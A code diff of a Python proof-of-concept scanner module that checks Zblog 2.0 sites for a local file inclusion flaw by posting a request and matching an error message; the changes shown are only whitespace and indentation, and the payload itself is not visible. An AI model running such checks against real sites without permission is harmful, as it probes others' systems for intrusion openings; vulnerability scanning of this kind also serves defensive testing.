@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'Zblog_0001'  # 平台漏洞编号，留空
     name = 'Zblog 本地文件包含'  # 漏洞名称
@@ -17,6 +18,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'Zblog'  # 漏洞应用名称
     product_version = 'Zblog 2.0'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '88200520-2ec1-48d5-9ba0-483a97c57205'
@@ -37,14 +39,15 @@ class Poc(ABPoc):
 
             req = requests.post(verify_url, data=payload)
             if 'Cannot use a scalar value' in req.content and req.status_code == 500:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
